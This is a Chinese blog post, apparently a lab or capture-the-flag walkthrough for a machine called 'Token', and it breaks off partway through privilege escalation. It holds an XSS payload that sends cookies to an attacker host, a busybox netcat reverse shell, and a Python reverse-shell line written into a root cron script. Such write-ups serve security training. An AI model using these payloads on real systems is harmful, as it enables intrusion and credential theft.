@@ -1,0 +1,767 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Miao">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="靶机说明QQ群：660930334 一、主机探测123456789101112131415┌──(root㉿kali)-[&#x2F;miao&#x2F;maze-sec&#x2F;token]└─# nmap -sn 192.168.2.0&#x2F;24              Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-25 09:01 CSTNmap scan r">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Token">
+<meta property="og:url" content="http://miao-sec.github.io/Maze-sec/Token/index.html">
+<meta property="og:site_name" content="Miao&#39;s Blog">
+<meta property="og:description" content="靶机说明QQ群：660930334 一、主机探测123456789101112131415┌──(root㉿kali)-[&#x2F;miao&#x2F;maze-sec&#x2F;token]└─# nmap -sn 192.168.2.0&#x2F;24              Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-25 09:01 CSTNmap scan r">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/27.jpg">
+<meta property="article:published_time" content="2025-07-28T01:20:25.000Z">
+<meta property="article:modified_time" content="2025-07-28T01:21:23.673Z">
+<meta property="article:author" content="Miao">
+<meta property="article:tag" content="xss">
+<meta property="article:tag" content="提权-定时任务">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/27.jpg">
+  
+  
+  
+  <title>Token - Miao&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassBg.css">
+<link rel="stylesheet" href="/css/macBorder.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"miao-sec.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"W5UPQ7BHtxFTBIoh5xr1UWMt-gzGzoHsz","app_key":"WEHCtPWZ5dJRfC1hhVipHKwQ","server_url":"https://w5upq7bh.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav
+  id="navbar"
+  class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"
+>
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title"
+        >Miaosec</strong
+      >
+    </a>
+
+    <button
+      id="navbar-toggler-btn"
+      class="navbar-toggler"
+      type="button"
+      data-toggle="collapse"
+      data-target="#navbarSupportedContent"
+      aria-controls="navbarSupportedContent"
+      aria-expanded="false"
+      aria-label="Toggle navigation"
+    >
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+            
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/"
+            target="_self"
+          >
+            <i class="iconfont icon-home-fill"></i>
+            <span>首页</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/archives/"
+            target="_self"
+          >
+            <i class="iconfont icon-archive-fill"></i>
+            <span>归档</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/categories/"
+            target="_self"
+          >
+            <i class="iconfont icon-category-fill"></i>
+            <span>分类</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/tags/"
+            target="_self"
+          >
+            <i class="iconfont icon-tags-fill"></i>
+            <span>标签</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/links/"
+            target="_self"
+          >
+            <i class="iconfont icon-link-fill"></i>
+            <span>友链</span>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="search-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            data-toggle="modal"
+            data-target="#modalSearch"
+            aria-label="Search"
+          >
+            <i class="iconfont icon-search"></i>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="color-toggle-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            aria-label="Color Toggle"
+          >
+            <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+          </a>
+        </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Token"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-07-28 09:20" pubdate>
+          2025年7月28日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          12 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Token</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p>
+<h1 id="一、主机探测"><a href="#一、主机探测" class="headerlink" title="一、主机探测"></a>一、主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/token]<br>└─# nmap -sn 192.168.2.0/24              <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-25 09:01 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00043s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00034s latency).<br>MAC Address: 08:00:27:C7:7C:7C (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.63<br>Host is up (0.00094s latency).<br>MAC Address: 08:00:27:5C:90:A4 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.04 seconds<br></code></pre></td></tr></table></figure>
+<p>靶机IP：<code>192.168.2.63</code></p>
+<h1 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/token]<br>└─# nmap --min-rate 10000 -p- 192.168.2.63                           <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-25 09:01 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.63<br>Host is up (0.00034s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>5000/tcp open  upnp<br>MAC Address: 08:00:27:5C:90:A4 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 3.61 seconds<br></code></pre></td></tr></table></figure>
+<p>开放端口：<code>22,80,5000</code></p>
+<h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/token]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80,5000 192.168.2.63<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-25 09:02 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.63<br>Host is up (0.0011s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.62 ((Debian))<br>| http-cookie-flags: <br>|   /: <br>|     PHPSESSID: <br>|_      httponly flag not <span class="hljs-built_in">set</span><br>|_http-server-header: Apache/2.4.62 (Debian)<br>| http-title: \xE7\xAE\xA1\xE7\x90\x86\xE5\x91\x98\xE7\x99\xBB\xE5\xBD\x95<br>|_Requested resource was login.php<br>5000/tcp open  upnp?<br>| fingerprint-strings: <br>|   GetRequest: <br>|     HTTP/1.1 404 NOT FOUND<br>|     Server: Werkzeug/3.1.3 Python/3.9.2<br>|     Date: Fri, 25 Jul 2025 01:02:23 GMT<br>|     Content-Type: text/html; charset=utf-8<br>|     Content-Length: 207<br>|     Connection: close<br>|     &lt;!doctype html&gt;<br>|     &lt;html lang=en&gt;<br>|     &lt;title&gt;404 Not Found&lt;/title&gt;<br>|     &lt;h1&gt;Not Found&lt;/h1&gt;<br>|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;<br>|   HTTPOptions: <br>|     HTTP/1.1 404 NOT FOUND<br>|     Server: Werkzeug/3.1.3 Python/3.9.2<br>|     Date: Fri, 25 Jul 2025 01:02:38 GMT<br>|     Content-Type: text/html; charset=utf-8<br>|     Content-Length: 207<br>|     Connection: close<br>|     &lt;!doctype html&gt;<br>|     &lt;html lang=en&gt;<br>|     &lt;title&gt;404 Not Found&lt;/title&gt;<br>|     &lt;h1&gt;Not Found&lt;/h1&gt;<br>|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;<br>|   Help: <br>|     &lt;!DOCTYPE HTML PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01//EN&quot;</span><br>|     <span class="hljs-string">&quot;http://www.w3.org/TR/html4/strict.dtd&quot;</span>&gt;<br>|     &lt;html&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;<br>|     &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>|     &lt;title&gt;Error response&lt;/title&gt;<br>|     &lt;/head&gt;<br>|     &lt;body&gt;<br>|     &lt;h1&gt;Error response&lt;/h1&gt;<br>|     &lt;p&gt;Error code: 400&lt;/p&gt;<br>|     &lt;p&gt;Message: Bad request syntax (<span class="hljs-string">&#x27;HELP&#x27;</span>).&lt;/p&gt;<br>|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;<br>|     &lt;/body&gt;<br>|     &lt;/html&gt;<br>|   RTSPRequest: <br>|     &lt;!DOCTYPE HTML PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01//EN&quot;</span><br>|     <span class="hljs-string">&quot;http://www.w3.org/TR/html4/strict.dtd&quot;</span>&gt;<br>|     &lt;html&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;<br>|     &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>|     &lt;title&gt;Error response&lt;/title&gt;<br>|     &lt;/head&gt;<br>|     &lt;body&gt;<br>|     &lt;h1&gt;Error response&lt;/h1&gt;<br>|     &lt;p&gt;Error code: 400&lt;/p&gt;<br>|     &lt;p&gt;Message: Bad request version (<span class="hljs-string">&#x27;RTSP/1.0&#x27;</span>).&lt;/p&gt;<br>|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;<br>|     &lt;/body&gt;<br>|_    &lt;/html&gt;<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?<br>....<br>MAC Address: 08:00:27:5C:90:A4 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 94.98 seconds<br></code></pre></td></tr></table></figure>
+
+<h1 id="三、WEB渗透"><a href="#三、WEB渗透" class="headerlink" title="三、WEB渗透"></a>三、WEB渗透</h1><h2 id="1、80端口"><a href="#1、80端口" class="headerlink" title="1、80端口"></a>1、80端口</h2><p>访问80端口，是一个登录页面<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507250912407.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<h3 id="1-目录扫描"><a href="#1-目录扫描" class="headerlink" title="1-目录扫描"></a>1-目录扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/token]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.63 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak,md,db,js<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.63<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              bak,md,db,js,php,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.php                 (Status: 403) [Size: 277]<br>/index.php            (Status: 302) [Size: 0] [--&gt; login.php]<br>/login.php            (Status: 200) [Size: 3484]<br>/.html                (Status: 403) [Size: 277]<br>/feedback.php         (Status: 200) [Size: 5008]<br>/messages.txt         (Status: 200) [Size: 0]<br>/logout.php           (Status: 302) [Size: 0] [--&gt; login.php]<br>/dashboard.php        (Status: 302) [Size: 0] [--&gt; login.php]<br>/.html                (Status: 403) [Size: 277]<br>/.php                 (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 1764480 / 1764488 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure>
+
+<p>找到两个路径<code>feedback.php</code>和<code>messages.txt</code>，进行访问，发现是一个留言页面和保存留言的页面<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507250950361.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<h3 id="2-XSS漏洞"><a href="#2-XSS漏洞" class="headerlink" title="2-XSS漏洞"></a>2-XSS漏洞</h3><p>查看<code>feedback.php</code>源码，发现提示存在<code>xss漏洞</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507251420950.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<p>构造一个xss脚本，获取<code>flask_token</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">&#x27;http://192.168.2.4/cookie_catcher.php?cookie=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+<p><code>flask_token=Authorization: Bearer ADMIN_T0K3N_Flask_Dashazi</code></p>
+<h2 id="2、5000端口"><a href="#2、5000端口" class="headerlink" title="2、5000端口"></a>2、5000端口</h2><h3 id="1-目录扫描-1"><a href="#1-目录扫描-1" class="headerlink" title="1-目录扫描"></a>1-目录扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/token]<br>└─# dirsearch -u <span class="hljs-string">&quot;http://192.168.2.63:5000&quot;</span><br>Target: http://192.168.2.63:5000/<br><br>[14:50:56] Starting: <br>[14:51:12] 302 -  199B  - /admin  -&gt;  /login<br>[14:51:32] 401 -   25B  - /cmd<br>[14:51:43] 200 -   44B  - /flag<br>[14:51:54] 200 -  323B  - /login<br><br>Task Completed<br></code></pre></td></tr></table></figure>
+
+<p>访问<code>cmd</code>，发现需要认证</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/token]<br>└─# curl http://192.168.2.63:5000/cmd                                                                                                    <br>&#123;<span class="hljs-string">&quot;error&quot;</span>:<span class="hljs-string">&quot;Unauthorized&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="2-命令执行"><a href="#2-命令执行" class="headerlink" title="2-命令执行"></a>2-命令执行</h3><p>加上获取到<code>flask_token</code>，发现可以执行命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/token]<br>└─# curl <span class="hljs-string">&quot;http://192.168.2.63:5000/cmd?cmd=id&quot;</span> -H <span class="hljs-string">&quot;Authorization: Bearer ADMIN_T0K3N_Flask_Dashazi&quot;</span> <br>&#123;<span class="hljs-string">&quot;output&quot;</span>:<span class="hljs-string">&quot;uid=33(www-data) gid=33(www-data) groups=33(www-data)\n&quot;</span>,<span class="hljs-string">&quot;status&quot;</span>:<span class="hljs-string">&quot;success&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="四、获取www-data权限"><a href="#四、获取www-data权限" class="headerlink" title="四、获取www-data权限"></a>四、获取www-data权限</h1><p>反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/token]<br>└─# curl <span class="hljs-string">&quot;http://192.168.2.63:5000/cmd?cmd=busybox%20nc%20192.168.2.4%204444%20-e%20/bin/bash&quot;</span> -H <span class="hljs-string">&quot;Authorization: Bearer ADMIN_T0K3N_Flask_Dashazi&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>成功获取到shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nc -lvnp 4444<br>listening on [any] 4444 ...<br><span class="hljs-built_in">id</span><br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.63] 54420<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure>
+
+<p><strong>USER FLAG</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Token:/home/catalytic$ <span class="hljs-built_in">cat</span> user.txt <br>flag&#123;user-caaea73c2af7f9b2391cc15f398b0e74&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h1><p>查看以<code>root</code>权限运行的进程</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Token:/home/catalytic$ ps aux | grep root<br>....<br>root      687534  0.0  0.0   2472   512 ?        Ss   03:27   0:00 /bin/sh -c /usr/bin/python3  /var/www/html/check_messages_cron/check_messages.py<br>root      687538  3.8  1.1 107264 24088 ?        Sl   03:27   0:00 /usr/bin/python3 /var/www/html/check_messages_cron/check_messages.py<br>....<br>www-data  689354  0.0  0.0   6176   632 pts/0    S+   03:27   0:00 grep root<br></code></pre></td></tr></table></figure>
+
+<p>发现在<code>/var/www/html/check_messages_cron/check_messages.py</code>以<code>root</code>权限运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Token:~/html$ <span class="hljs-built_in">ls</span> -la check_messages_cron/check_messages.py <br>-rwxr-xr-x 1 www-data www-data 1842 Jul 22 02:03 check_messages_cron/check_messages.py<br></code></pre></td></tr></table></figure>
+
+<p>修改文件<code>check_messages.py</code>的内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span><span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.2.4&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span> &gt; /var/www/html/check_messages_cron/check_messages.py<br></code></pre></td></tr></table></figure>
+
